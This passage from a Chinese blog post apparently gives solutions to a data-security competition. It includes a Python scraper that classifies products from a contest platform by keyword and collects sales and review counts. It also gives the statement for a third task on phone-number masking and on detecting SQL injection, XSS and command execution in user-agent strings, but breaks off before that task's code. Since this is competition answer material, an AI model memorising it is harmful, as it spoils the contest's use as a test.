class="hljs-string">&#x27;珍珠&#x27;</span>, <span class="hljs-string">&#x27;和田玉&#x27;</span>, <span class="hljs-string">&#x27;琥珀&#x27;</span>,<br>          <span class="hljs-string">&#x27;蜜蜡&#x27;</span>, <span class="hljs-string">&#x27;珊瑚&#x27;</span>, <span class="hljs-string">&#x27;绿松石&#x27;</span>, <span class="hljs-string">&#x27;红宝石&#x27;</span>, <span class="hljs-string">&#x27;蓝宝石&#x27;</span>, <span class="hljs-string">&#x27;祖母绿&#x27;</span>, <span class="hljs-string">&#x27;婚戒&#x27;</span>, <span class="hljs-string">&#x27;吊坠&#x27;</span>,<br>          <span class="hljs-string">&#x27;手链&#x27;</span>, <span class="hljs-string">&#x27;耳环&#x27;</span>, <span class="hljs-string">&#x27;胸针&#x27;</span>, <span class="hljs-string">&#x27;转运珠&#x27;</span>, <span class="hljs-string">&#x27;生肖挂件&#x27;</span>, <span class="hljs-string">&#x27;文玩核桃&#x27;</span>]),<br><br>    (<span class="hljs-number">14</span>, [<span class="hljs-string">&#x27;酒水&#x27;</span>, <span class="hljs-string">&#x27;红酒&#x27;</span>, <span class="hljs-string">&#x27;白酒&#x27;</span>, <span class="hljs-string">&#x27;威士忌&#x27;</span>, <span class="hljs-string">&#x27;啤酒&#x27;</span>, <span class="hljs-string">&#x27;黄酒&#x27;</span>, <span class="hljs-string">&#x27;清酒&#x27;</span>, <span class="hljs-string">&#x27;伏特加&#x27;</span>, <span class="hljs-string">&#x27;朗姆酒&#x27;</span>,<br>          <span class="hljs-string">&#x27;鸡尾酒&#x27;</span>, <span class="hljs-string">&#x27;起泡酒&#x27;</span>, <span class="hljs-string">&#x27;香槟&#x27;</span>, <span class="hljs-string">&#x27;精酿啤酒&#x27;</span>, <span class="hljs-string">&#x27;果酒&#x27;</span>, <span class="hljs-string">&#x27;保健酒&#x27;</span>, <span class="hljs-string">&#x27;酒具&#x27;</span>, <span class="hljs-string">&#x27;醒酒器&#x27;</span>,<br>          <span class="hljs-string">&#x27;红酒杯&#x27;</span>, <span class="hljs-string">&#x27;酒柜&#x27;</span>, <span class="hljs-string">&#x27;酒窖&#x27;</span>, <span class="hljs-string">&#x27;年份酒&#x27;</span>, <span class="hljs-string">&#x27;原浆酒&#x27;</span>]),<br><br>    (<span class="hljs-number">5</span>, [<span class="hljs-string">&#x27;蔬菜&#x27;</span>, <span class="hljs-string">&#x27;有机&#x27;</span>, <span class="hljs-string">&#x27;绿叶菜&#x27;</span>, <span class="hljs-string">&#x27;西红柿&#x27;</span>, <span class="hljs-string">&#x27;黄瓜&#x27;</span>, <span class="hljs-string">&#x27;胡萝卜&#x27;</span>, <span class="hljs-string">&#x27;土豆&#x27;</span>, <span class="hljs-string">&#x27;辣椒&#x27;</span>, <span class="hljs-string">&#x27;茄子&#x27;</span>,<br>         <span class="hljs-string">&#x27;西兰花&#x27;</span>, <span class="hljs-string">&#x27;菠菜&#x27;</span>, <span class="hljs-string">&#x27;芹菜&#x27;</span>, <span class="hljs-string">&#x27;莲藕&#x27;</span>, <span class="hljs-string">&#x27;菌菇&#x27;</span>, <span class="hljs-string">&#x27;豆角&#x27;</span>, <span class="hljs-string">&#x27;南瓜&#x27;</span>, <span class="hljs-string">&#x27;山药&#x27;</span>, <span class="hljs-string">&#x27;芦笋&#x27;</span>,<br>         <span class="hljs-string">&#x27;秋葵&#x27;</span>, <span class="hljs-string">&#x27;娃娃菜&#x27;</span>, <span class="hljs-string">&#x27;冰草&#x27;</span>, <span class="hljs-string">&#x27;羽衣甘蓝&#x27;</span>, <span class="hljs-string">&#x27;芽苗菜&#x27;</span>]),<br><br>    (<span class="hljs-number">8</span>, [<span class="hljs-string">&#x27;水果&#x27;</span>, <span class="hljs-string">&#x27;进口&#x27;</span>, <span class="hljs-string">&#x27;榴莲&#x27;</span>, <span class="hljs-string">&#x27;车厘子&#x27;</span>, <span class="hljs-string">&#x27;蓝莓&#x27;</span>, <span class="hljs-string">&#x27;草莓&#x27;</span>, <span class="hljs-string">&#x27;芒果&#x27;</span>, <span class="hljs-string">&#x27;奇异果&#x27;</span>, <span class="hljs-string">&#x27;山竹&#x27;</span>,<br>         <span class="hljs-string">&#x27;菠萝蜜&#x27;</span>, <span class="hljs-string">&#x27;牛油果&#x27;</span>, <span class="hljs-string">&#x27;莲雾&#x27;</span>, <span class="hljs-string">&#x27;释迦果&#x27;</span>, <span class="hljs-string">&#x27;火龙果&#x27;</span>, <span class="hljs-string">&#x27;椰子&#x27;</span>, <span class="hljs-string">&#x27;百香果&#x27;</span>, <span class="hljs-string">&#x27;番石榴&#x27;</span>,<br>         <span class="hljs-string">&#x27;杨桃&#x27;</span>, <span class="hljs-string">&#x27;枇杷&#x27;</span>, <span class="hljs-string">&#x27;西梅&#x27;</span>, <span class="hljs-string">&#x27;无花果&#x27;</span>, <span class="hljs-string">&#x27;人参果&#x27;</span>]),<br><br>    (<span class="hljs-number">4</span>, [<span class="hljs-string">&#x27;书籍&#x27;</span>, <span class="hljs-string">&#x27;小说&#x27;</span>, <span class="hljs-string">&#x27;教材&#x27;</span>, <span class="hljs-string">&#x27;儿童读物&#x27;</span>, <span class="hljs-string">&#x27;科技&#x27;</span>, <span class="hljs-string">&#x27;文学&#x27;</span>, <span class="hljs-string">&#x27;历史&#x27;</span>, <span class="hljs-string">&#x27;哲学&#x27;</span>, <span class="hljs-string">&#x27;心理学&#x27;</span>,<br>         <span class="hljs-string">&#x27;经济学&#x27;</span>, <span class="hljs-string">&#x27;计算机&#x27;</span>, <span class="hljs-string">&#x27;编程&#x27;</span>, <span class="hljs-string">&#x27;医学&#x27;</span>, <span class="hljs-string">&#x27;法律&#x27;</span>, <span class="hljs-string">&#x27;建筑&#x27;</span>, <span class="hljs-string">&#x27;艺术&#x27;</span>, <span class="hljs-string">&#x27;摄影&#x27;</span>, <span class="hljs-string">&#x27;旅游指南&#x27;</span>,<br>         <span class="hljs-string">&#x27;字帖&#x27;</span>, <span class="hljs-string">&#x27;绘本&#x27;</span>, <span class="hljs-string">&#x27;百科全书&#x27;</span>, <span class="hljs-string">&#x27;字典&#x27;</span>, <span class="hljs-string">&#x27;考试用书&#x27;</span>]),<br><br>    (<span class="hljs-number">24</span>, [<span class="hljs-string">&#x27;游戏&#x27;</span>, <span class="hljs-string">&#x27;PS5&#x27;</span>, <span class="hljs-string">&#x27;Switch&#x27;</span>, <span class="hljs-string">&#x27;Xbox&#x27;</span>, <span class="hljs-string">&#x27;手柄&#x27;</span>, <span class="hljs-string">&#x27;游戏卡带&#x27;</span>, <span class="hljs-string">&#x27;游戏光盘&#x27;</span>, <span class="hljs-string">&#x27;电竞椅&#x27;</span>,<br>          <span class="hljs-string">&#x27;游戏鼠标&#x27;</span>, <span class="hljs-string">&#x27;机械键盘&#x27;</span>, <span class="hljs-string">&#x27;游戏耳机&#x27;</span>, <span class="hljs-string">&#x27;VR设备&#x27;</span>, <span class="hljs-string">&#x27;游戏周边&#x27;</span>, <span class="hljs-string">&#x27;手办&#x27;</span>, <span class="hljs-string">&#x27;游戏点卡&#x27;</span>,<br>          <span class="hljs-string">&#x27;游戏加速器&#x27;</span>, <span class="hljs-string">&#x27;游戏皮肤&#x27;</span>, <span class="hljs-string">&#x27;游戏账号&#x27;</span>, <span class="hljs-string">&#x27;MOD工具&#x27;</span>, <span class="hljs-string">&#x27;游戏攻略书&#x27;</span>]),<br><br>    (<span class="hljs-number">12</span>, [<span class="hljs-string">&#x27;彩妆&#x27;</span>, <span class="hljs-string">&#x27;口红&#x27;</span>, <span class="hljs-string">&#x27;粉底&#x27;</span>, <span class="hljs-string">&#x27;眼影&#x27;</span>, <span class="hljs-string">&#x27;眉笔&#x27;</span>, <span class="hljs-string">&#x27;腮红&#x27;</span>, <span class="hljs-string">&#x27;遮瑕&#x27;</span>, <span class="hljs-string">&#x27;化妆刷&#x27;</span>, <span class="hljs-string">&#x27;美妆蛋&#x27;</span>,<br>          <span class="hljs-string">&#x27;定妆喷雾&#x27;</span>, <span class="hljs-string">&#x27;睫毛膏&#x27;</span>, <span class="hljs-string">&#x27;眼线笔&#x27;</span>, <span class="hljs-string">&#x27;修容棒&#x27;</span>, <span class="hljs-string">&#x27;高光&#x27;</span>, <span class="hljs-string">&#x27;妆前乳&#x27;</span>, <span class="hljs-string">&#x27;卸妆水&#x27;</span>, <span class="hljs-string">&#x27;美瞳&#x27;</span>,<br>          <span class="hljs-string">&#x27;假睫毛&#x27;</span>, <span class="hljs-string">&#x27;美甲贴&#x27;</span>, <span class="hljs-string">&#x27;化妆镜&#x27;</span>, <span class="hljs-string">&#x27;美容工具&#x27;</span>, <span class="hljs-string">&#x27;香水&#x27;</span>]),<br><br>    (<span class="hljs-number">17</span>, [<span class="hljs-string">&#x27;床上用品&#x27;</span>, <span class="hljs-string">&#x27;四件套&#x27;</span>, <span class="hljs-string">&#x27;羽绒被&#x27;</span>, <span class="hljs-string">&#x27;枕头&#x27;</span>, <span class="hljs-string">&#x27;床垫&#x27;</span>, <span class="hljs-string">&#x27;蚕丝被&#x27;</span>, <span class="hljs-string">&#x27;乳胶枕&#x27;</span>, <span class="hljs-string">&#x27;凉席&#x27;</span>,<br>          <span class="hljs-string">&#x27;床褥&#x27;</span>, <span class="hljs-string">&#x27;床笠&#x27;</span>, <span class="hljs-string">&#x27;被套&#x27;</span>, <span class="hljs-string">&#x27;枕套&#x27;</span>, <span class="hljs-string">&#x27;蚊帐&#x27;</span>, <span class="hljs-string">&#x27;电热毯&#x27;</span>, <span class="hljs-string">&#x27;记忆棉&#x27;</span>, <span class="hljs-string">&#x27;榻榻米&#x27;</span>,<br>          <span class="hljs-string">&#x27;床幔&#x27;</span>, <span class="hljs-string">&#x27;靠垫&#x27;</span>, <span class="hljs-string">&#x27;抱枕&#x27;</span>, <span class="hljs-string">&#x27;床尾凳&#x27;</span>, <span class="hljs-string">&#x27;布艺床&#x27;</span>]),<br><br>    (<span class="hljs-number">18</span>, [<span class="hljs-string">&#x27;洗护&#x27;</span>, <span class="hljs-string">&#x27;洗发水&#x27;</span>, <span class="hljs-string">&#x27;沐浴露&#x27;</span>, <span class="hljs-string">&#x27;牙膏&#x27;</span>, <span class="hljs-string">&#x27;洗面奶&#x27;</span>, <span class="hljs-string">&#x27;护发素&#x27;</span>, <span class="hljs-string">&#x27;身体乳&#x27;</span>, <span class="hljs-string">&#x27;洗手液&#x27;</span>,<br>          <span class="hljs-string">&#x27;洗衣液&#x27;</span>, <span class="hljs-string">&#x27;柔顺剂&#x27;</span>, <span class="hljs-string">&#x27;消毒液&#x27;</span>, <span class="hljs-string">&#x27;洁厕灵&#x27;</span>, <span class="hljs-string">&#x27;厨房清洁剂&#x27;</span>, <span class="hljs-string">&#x27;玻璃水&#x27;</span>, <span class="hljs-string">&#x27;除霉剂&#x27;</span>,<br>          <span class="hljs-string">&#x27;空气清新剂&#x27;</span>, <span class="hljs-string">&#x27;香薰&#x27;</span>, <span class="hljs-string">&#x27;除螨仪&#x27;</span>, <span class="hljs-string">&#x27;洗衣凝珠&#x27;</span>, <span class="hljs-string">&#x27;衣物除菌液&#x27;</span>]),<br><br>    (<span class="hljs-number">7</span>, [<span class="hljs-string">&#x27;办公&#x27;</span>, <span class="hljs-string">&#x27;打印机&#x27;</span>, <span class="hljs-string">&#x27;投影仪&#x27;</span>, <span class="hljs-string">&#x27;复印纸&#x27;</span>, <span class="hljs-string">&#x27;文件夹&#x27;</span>, <span class="hljs-string">&#x27;订书机&#x27;</span>, <span class="hljs-string">&#x27;碎纸机&#x27;</span>, <span class="hljs-string">&#x27;考勤机&#x27;</span>,<br>         <span class="hljs-string">&#x27;白板&#x27;</span>, <span class="hljs-string">&#x27;会议电话&#x27;</span>, <span class="hljs-string">&#x27;文件柜&#x27;</span>, <span class="hljs-string">&#x27;保险箱&#x27;</span>, <span class="hljs-string">&#x27;装订机&#x27;</span>, <span class="hljs-string">&#x27;标签机&#x27;</span>, <span class="hljs-string">&#x27;支票打印机&#x27;</span>,<br>         <span class="hljs-string">&#x27;扫描仪&#x27;</span>, <span class="hljs-string">&#x27;指纹打卡机&#x27;</span>, <span class="hljs-string">&#x27;办公沙发&#x27;</span>, <span class="hljs-string">&#x27;会议桌&#x27;</span>, <span class="hljs-string">&#x27;办公隔断&#x27;</span>]),<br><br>    (<span class="hljs-number">3</span>, [<span class="hljs-string">&#x27;家居&#x27;</span>, <span class="hljs-string">&#x27;沙发&#x27;</span>, <span class="hljs-string">&#x27;茶几&#x27;</span>, <span class="hljs-string">&#x27;窗帘&#x27;</span>, <span class="hljs-string">&#x27;地毯&#x27;</span>, <span class="hljs-string">&#x27;衣柜&#x27;</span>, <span class="hljs-string">&#x27;餐桌&#x27;</span>, <span class="hljs-string">&#x27;电视柜&#x27;</span>, <span class="hljs-string">&#x27;鞋柜&#x27;</span>,<br>         <span class="hljs-string">&#x27;置物架&#x27;</span>, <span class="hljs-string">&#x27;装饰画&#x27;</span>, <span class="hljs-string">&#x27;花瓶&#x27;</span>, <span class="hljs-string">&#x27;壁纸&#x27;</span>, <span class="hljs-string">&#x27;灯具&#x27;</span>, <span class="hljs-string">&#x27;智能门锁&#x27;</span>, <span class="hljs-string">&#x27;晾衣架&#x27;</span>, <span class="hljs-string">&#x27;收纳盒&#x27;</span>,<br>         <span class="hljs-string">&#x27;墙贴&#x27;</span>, <span class="hljs-string">&#x27;门垫&#x27;</span>, <span class="hljs-string">&#x27;家居摆件&#x27;</span>, <span class="hljs-string">&#x27;香炉&#x27;</span>]),<br><br>    (<span class="hljs-number">9</span>, [<span class="hljs-string">&#x27;宠物&#x27;</span>, <span class="hljs-string">&#x27;猫粮&#x27;</span>, <span class="hljs-string">&#x27;狗粮&#x27;</span>, <span class="hljs-string">&#x27;宠物窝&#x27;</span>, <span class="hljs-string">&#x27;牵引绳&#x27;</span>, <span class="hljs-string">&#x27;猫砂&#x27;</span>, <span class="hljs-string">&#x27;宠物玩具&#x27;</span>, <span class="hljs-string">&#x27;宠物衣服&#x27;</span>,<br>         <span class="hljs-string">&#x27;宠物浴液&#x27;</span>, <span class="hljs-string">&#x27;驱虫药&#x27;</span>, <span class="hljs-string">&#x27;宠物笼&#x27;</span>, <span class="hljs-string">&#x27;食盆&#x27;</span>, <span class="hljs-string">&#x27;自动喂食器&#x27;</span>, <span class="hljs-string">&#x27;猫抓板&#x27;</span>, <span class="hljs-string">&#x27;宠物推车&#x27;</span>,<br>         <span class="hljs-string">&#x27;宠物背包&#x27;</span>, <span class="hljs-string">&#x27;宠物美容&#x27;</span>, <span class="hljs-string">&#x27;宠物医院&#x27;</span>, <span class="hljs-string">&#x27;宠物殡葬&#x27;</span>, <span class="hljs-string">&#x27;宠物芯片&#x27;</span>]),<br><br>    (<span class="hljs-number">13</span>, [<span class="hljs-string">&#x27;保健&#x27;</span>, <span class="hljs-string">&#x27;鱼油&#x27;</span>, <span class="hljs-string">&#x27;维生素&#x27;</span>, <span class="hljs-string">&#x27;钙片&#x27;</span>, <span class="hljs-string">&#x27;蛋白粉&#x27;</span>, <span class="hljs-string">&#x27;益生菌&#x27;</span>, <span class="hljs-string">&#x27;褪黑素&#x27;</span>, <span class="hljs-string">&#x27;护肝片&#x27;</span>,<br>          <span class="hljs-string">&#x27;胶原蛋白&#x27;</span>, <span class="hljs-string">&#x27;葡萄籽&#x27;</span>, <span class="hljs-string">&#x27;辅酶Q10&#x27;</span>, <span class="hljs-string">&#x27;氨糖&#x27;</span>, <span class="hljs-string">&#x27;膳食纤维&#x27;</span>, <span class="hljs-string">&#x27;蜂胶&#x27;</span>, <span class="hljs-string">&#x27;冬虫夏草&#x27;</span>,<br>          <span class="hljs-string">&#x27;阿胶&#x27;</span>, <span class="hljs-string">&#x27;燕窝&#x27;</span>, <span class="hljs-string">&#x27;人参&#x27;</span>, <span class="hljs-string">&#x27;灵芝孢子粉&#x27;</span>, <span class="hljs-string">&#x27;按摩器&#x27;</span>, <span class="hljs-string">&#x27;足浴盆&#x27;</span>]),<br><br>    (<span class="hljs-number">19</span>, [<span class="hljs-string">&#x27;五金&#x27;</span>, <span class="hljs-string">&#x27;螺丝刀&#x27;</span>, <span class="hljs-string">&#x27;电钻&#x27;</span>, <span class="hljs-string">&#x27;扳手&#x27;</span>, <span class="hljs-string">&#x27;工具箱&#x27;</span>, <span class="hljs-string">&#x27;角磨机&#x27;</span>, <span class="hljs-string">&#x27;电锤&#x27;</span>, <span class="hljs-string">&#x27;切割机&#x27;</span>,<br>          <span class="hljs-string">&#x27;水平仪&#x27;</span>, <span class="hljs-string">&#x27;卷尺&#x27;</span>, <span class="hljs-string">&#x27;钳子&#x27;</span>, <span class="hljs-string">&#x27;焊枪&#x27;</span>, <span class="hljs-string">&#x27;砂轮机&#x27;</span>, <span class="hljs-string">&#x27;冲击钻&#x27;</span>, <span class="hljs-string">&#x27;电动螺丝刀&#x27;</span>, <span class="hljs-string">&#x27;开孔器&#x27;</span>,<br>          <span class="hljs-string">&#x27;水管配件&#x27;</span>, <span class="hljs-string">&#x27;阀门&#x27;</span>, <span class="hljs-string">&#x27;密封胶&#x27;</span>, <span class="hljs-string">&#x27;膨胀螺栓&#x27;</span>, <span class="hljs-string">&#x27;绝缘胶带&#x27;</span>]),<br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">match_category</span>(<span class="hljs-params">product_name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;智能分类匹配算法&quot;&quot;&quot;</span><br>    clean_name = product_name.lower()<br>    <span class="hljs-keyword">for</span> category_id, keywords <span class="hljs-keyword">in</span> CATEGORY_KEYWORDS:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(kw <span class="hljs-keyword">in</span> clean_name <span class="hljs-keyword">for</span> kw <span class="hljs-keyword">in</span> keywords):<br>            <span class="hljs-keyword">return</span> category_id<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># 未匹配分类</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_sales</span>(<span class="hljs-params">text: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;精准解析销量数值&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 直接提取标签内容中的纯数字</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(<span class="hljs-built_in">int</span>(text.strip()), <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-comment"># 双重保障：正则提取</span><br>        numbers = re.findall(<span class="hljs-string">r&#x27;\d+&#x27;</span>, text)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(numbers[<span class="hljs-number">0</span>]) <span class="hljs-keyword">if</span> numbers <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_product_info</span>(<span class="hljs-params">session: requests.Session, product_id: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-type">Optional</span>[<span class="hljs-type">Tuple</span>]:<br>    <span class="hljs-string">&quot;&quot;&quot;获取并解析商品信息（增强描述解析版）&quot;&quot;&quot;</span><br>    params = &#123;<br>        <span class="hljs-string">&quot;controller&quot;</span>: <span class="hljs-string">&quot;product&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;detail&quot;</span>,<br>        <span class="hljs-string">&quot;id&quot;</span>: product_id<br>    &#125;<br><br>    <span class="hljs-keyword">try</span>:<br>        response = session.get(<br>            Config.full_url(),<br>            params=params,<br>            timeout=Config.REQUEST_TIMEOUT<br>        )<br>        response.raise_for_status()<br>        soup = BeautifulSoup(response.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br><br>        <span class="hljs-comment"># 解析商品名称</span><br>        name_tag = soup.find(<span class="hljs-string">&#x27;h1&#x27;</span>, &#123;<span class="hljs-string">&#x27;class&#x27;</span>: <span class="hljs-string">&#x27;product-name&#x27;</span>&#125;)<br>        product_name = name_tag.text.strip() <span class="hljs-keyword">if</span> name_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br><br>        <span class="hljs-comment"># 新增：解析商品描述（关键修改点）</span><br>        desc_tag = soup.find(<span class="hljs-string">&#x27;div&#x27;</span>, &#123;<span class="hljs-string">&#x27;class&#x27;</span>: <span class="hljs-string">&#x27;product-description&#x27;</span>&#125;)<br>        product_desc = desc_tag.find(<span class="hljs-string">&#x27;p&#x27;</span>).text.strip() <span class="hljs-keyword">if</span> desc_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br><br>        <span class="hljs-comment"># 合并名称和描述进行匹配</span><br>        match_text = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;product_name&#125;</span> <span class="hljs-subst">&#123;product_desc&#125;</span>&quot;</span>.lower()<br><br>        <span class="hljs-comment"># 解析销量信息</span><br>        sales_tag = soup.find(<span class="hljs-string">&#x27;span&#x27;</span>, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;productSales&#x27;</span>&#125;)<br>        sales_text = sales_tag.text.strip() <span class="hljs-keyword">if</span> sales_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;0&quot;</span><br>        sales = parse_sales(sales_text)<br><br>        <span class="hljs-comment"># 解析评论数量</span><br>        reviews_tag = soup.find(<span class="hljs-string">&#x27;div&#x27;</span>, &#123;<span class="hljs-string">&#x27;class&#x27;</span>: <span class="hljs-string">&#x27;reviews-container&#x27;</span>&#125;)<br>        reviews_number = <span class="hljs-built_in">len</span>(reviews_tag.find_all(<span class="hljs-string">&#x27;div&#x27;</span>, class_=<span class="hljs-string">&#x27;review-item&#x27;</span>)) <span class="hljs-keyword">if</span> reviews_tag <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br><br>        <span class="hljs-comment"># 分类匹配（使用合并文本）</span><br>        category_id = match_category(match_text)  <span class="hljs-comment"># 这里传入合并后的文本</span><br><br>        <span class="hljs-keyword">return</span> (product_id, sales, category_id, reviews_number)<br><br>    <span class="hljs-keyword">except</span> requests.exceptions.HTTPError <span class="hljs-keyword">as</span> e:<br>        logger.warning(<span class="hljs-string">f&quot;商品 <span class="hljs-subst">&#123;product_id&#125;</span> 请求失败: HTTP <span class="hljs-subst">&#123;e.response.status_code&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logger.error(<span class="hljs-string">f&quot;处理商品 <span class="hljs-subst">&#123;product_id&#125;</span> 时发生异常: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">data_validation</span>(<span class="hljs-params">df: pd.DataFrame</span>) -&gt; pd.DataFrame:<br>    <span class="hljs-string">&quot;&quot;&quot;数据完整性校验&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 处理未匹配分类</span><br>    df[<span class="hljs-string">&#x27;category_id&#x27;</span>] = df[<span class="hljs-string">&#x27;category_id&#x27;</span>].replace(<span class="hljs-number">0</span>, <span class="hljs-number">25</span>)  <span class="hljs-comment"># 默认归类到园艺</span><br><br>    <span class="hljs-comment"># 处理异常评论数</span><br>    df[<span class="hljs-string">&#x27;reviews_number&#x27;</span>] = df[<span class="hljs-string">&#x27;reviews_number&#x27;</span>].clip(lower=<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">return</span> df.sort_values(<span class="hljs-string">&#x27;product_id&#x27;</span>)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;主处理流程&quot;&quot;&quot;</span><br>    product_data = []<br><br>    <span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:<br>        session.headers.update(Config.HEADERS)<br><br>        <span class="hljs-comment"># 带重试机制的爬取</span><br>        <span class="hljs-keyword">for</span> product_id <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, Config.MAX_PRODUCTS + <span class="hljs-number">1</span>), desc=<span class="hljs-string">&quot;处理商品&quot;</span>):<br>            <span class="hljs-keyword">for</span> retry <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>                <span class="hljs-keyword">if</span> info := fetch_product_info(session, product_id):<br>                    product_data.append(info)<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    logger.warning(<span class="hljs-string">f&quot;商品 <span class="hljs-subst">&#123;product_id&#125;</span> 第 <span class="hljs-subst">&#123;retry + <span class="hljs-number">1</span>&#125;</span> 次重试&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> product_data:<br>        logger.error(<span class="hljs-string">&quot;未获取到有效数据&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-comment"># 数据加工</span><br>    df = pd.DataFrame(<br>        product_data,<br>        columns=[<span class="hljs-string">&#x27;product_id&#x27;</span>, <span class="hljs-string">&#x27;sales&#x27;</span>, <span class="hljs-string">&#x27;category_id&#x27;</span>, <span class="hljs-string">&#x27;reviews_number&#x27;</span>]<br>    )<br><br>    df = data_validation(df)<br><br>    <span class="hljs-comment"># 保存结果</span><br>    df.to_csv(Config.OUTPUT_FILE, index=<span class="hljs-literal">False</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    logger.info(<span class="hljs-string">f&quot;成功生成文件 <span class="hljs-subst">&#123;Config.OUTPUT_FILE&#125;</span>，记录数: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(df)&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="3-任务三：隐私保护与恶意检测"><a href="#3-任务三：隐私保护与恶意检测" class="headerlink" title="3.任务三：隐私保护与恶意检测"></a>3.任务三：隐私保护与恶意检测</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gradle">【题⼲描述】<br>针对在线团购平台提供的⽤⼾数据，你需要爬取数据后进⾏数据脱敏与恶意代码检测，在数据脱敏环节，你需要对⼿机号码按照对应的规则进⾏脱敏替换。在恶意代码检测环节，你需要对评论user_agent进⾏SQL注⼊<span class="hljs-regexp">/XSS/</span>命令执⾏等恶意代码检测。按附件模板和任务书要求提交处理后的submit_3.csv⽂件进⾏评分。<br><br>【答案提交】<br>提交仅包含<span class="hljs-number">3</span>列内容的submit_3.csv⽂件。<br>• 第⼀列为user_id（需要与在线团购平台中⽤⼾评价的⽤⼾ID对应，严格按照升序排列）<br>• 第⼆列为desensitization（根据脱敏规则填写脱敏后的⼿机号）<br>• 第三列为code_check（根据user_id，判断所对应的使⽤设备字符串是否包含恶意代码规则所述内<br>容，存在则为<span class="hljs-keyword">FALSE</span>，不存在恶意代码则为<span class="hljs-keyword">TRUE</span> ）<br></code></pre></td></tr></table></figure><p>和上面两个逻辑差不多，只是需要对 user-agent 进行检测即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 